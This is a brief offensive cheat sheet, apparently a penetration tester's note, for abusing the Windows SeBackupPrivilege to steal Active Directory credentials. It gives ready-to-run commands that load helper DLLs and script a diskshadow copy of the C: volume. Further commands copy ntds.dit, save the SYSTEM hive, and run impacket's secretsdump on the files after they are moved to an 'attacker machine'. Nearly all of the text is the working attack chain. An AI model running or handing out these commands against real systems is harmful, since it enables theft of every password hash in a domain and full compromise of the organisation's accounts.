# SeBackupPrivilege
-----------------
https://github.com/giuliano108/SeBackupPrivilege

Import the DLL using:
```
Import-Module ./SeBackupPrivilegeUtils.dll
Import-Module ./SeBackupPrivilegeCmdLets.dll
```

## Shadow Copy
copy.txt for shadow copy:
```txt
set context persistent nowriters
set metadata C:\temp\metadata.cab
set verbose on
add volume c: alias mycopy
create
expose %mycopy% x:
```

```
diskshadow /s copy.txt
```

```
Copy-FileSeBackupPrivilege x:windows\ntds\ntds.dit C:\temp\ntds.dit

reg save hklm\system C:\temp\system.back
```

Transfer the files back to the attacker machine and get the hashes using impacket:

```bash
python3 /opt/impacket/examples/secretsdump.py -ntds ntds.dit -system system.back local
```
